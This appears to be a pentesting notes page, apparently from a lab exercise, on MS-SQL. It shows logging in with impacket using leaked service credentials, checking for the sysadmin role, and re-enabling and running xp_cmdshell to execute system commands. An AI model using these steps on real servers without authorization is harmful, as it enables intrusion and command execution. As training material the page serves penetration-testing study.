# MS-SQL (Microsoft SQL Service)

## Enumeration

### Using Impacket&#x20;

Using impacket-mssqlclient we can connect to the MS-SQL service using the username/user-id and password from a possible publicly available production `.dtsConfig` files.&#x20;

```awk
impacket-mssqlclient ARCHETYPE\sql_svc@10.129.95.187 -windows-auth
```

### Check user access control

```
SELECT is_srvrolemember('sysadmin');
```

If it returns 1, it is True and the user can run cmd commands.



## Exploitation

### Command execution via xp\_cmdshell()

Once we have access to the SQL database we can check if we can use the command using:

```sql
 EXEC xp_cmdshell 'net user';
```

If we get the following result, we don't have access to the command and we need to reconfigure the service:

{% code overflow="wrap" %}
```bash
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```
{% endcode %}

**Reconfiguration steps**

* Set the show advanced options to TRUE.&#x20;

```sql
EXEC sp_configure 'show advanced options', 1;
```

* Reconfigure using the RECONFIGURE command.

```sql
RECONFIGURE;
```

* Check if sp\_configure is working with advanced options

```
sp_configure;
```

* Allow xp\_cmdshell using the command:

```sql
EXEC sp_configure 'xp_cmdshell', 1;
```

* Run reconfigure again to allow the xp\_cmdshell method. Test if its working or not using the above diagnosis command.
*



